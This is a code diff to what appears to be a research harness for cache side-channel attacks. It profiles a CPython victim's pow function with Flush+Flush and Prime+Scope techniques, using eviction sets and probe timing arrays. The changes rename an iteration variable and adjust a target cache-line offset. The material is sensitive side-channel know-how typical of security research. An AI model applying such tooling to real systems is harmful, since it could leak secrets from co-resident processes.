@@ -21,7 +21,7 @@
 
 CPYTHON_TARGET_CACHELINE(DECLARE_CACHE_LINE);
 sync_ctx_t sync_ctx;
-uint64_t victim_iteration = 4;
+uint64_t victim_runs = 1;
 
 #if USE_FF
 static const uint64_t waiting_time = 80000;
@@ -40,7 +40,7 @@ void FF_profile_pow() {
 
 	create_directory("output");
 
-	for (int i = 0; i < victim_iteration; ++i) {
+	for (int i = 0; i < victim_runs; ++i) {
 		log_info("Attacker Iteration %d", i);
 		char output_file[32];
 		sprintf(output_file, "output/%d.out", i);
@@ -97,7 +97,6 @@ void FF_profile_pow() {
 #elif USE_PS
 
 enum { cache_line_count = 3, profile_samples = 1 << 15 };
-static uint64_t victim_runs = 1;
 static const uint64_t max_exec_cycles = (uint64_t)3e9;
 static uint64_t probe_time_arr[cache_line_count][profile_samples];
 static uint64_t sample_tsc_arr[cache_line_count][profile_samples];
@@ -134,7 +133,7 @@ void PS_profile_pow() {
 	pt_consume_zero.slot = 0;
 	pt_consume_zero.pin_cpu = -1;
 	pt_consume_zero.target =
-	    (uint8_t *)((uintptr_t)target_consume_zero + 3 * CACHE_LINE_SIZE);
+	    (uint8_t *)((uintptr_t)target_consume_zero + 2 * CACHE_LINE_SIZE);
 	pt_consume_zero.evset = prepare_evset(pt_consume_zero.target, &hctrl);
 
 	PS_thread_config_init(pt_absorb_window);
@@ -185,11 +184,11 @@ int main(int argc, char **argv) {
 		errno = 0;
 		const uint64_t value = strtoull(argv[1], &endptr, 10);
 		if (errno == 0 && endptr != argv[1] && *endptr == '\0') {
-			victim_iteration = value;
+			victim_runs = value;
 		}
 	}
 
-	if (victim_iteration == 0) {
+	if (victim_runs == 0) {
 		log_error("python iterations has to be non-zero");
 		exit(1);
 	}
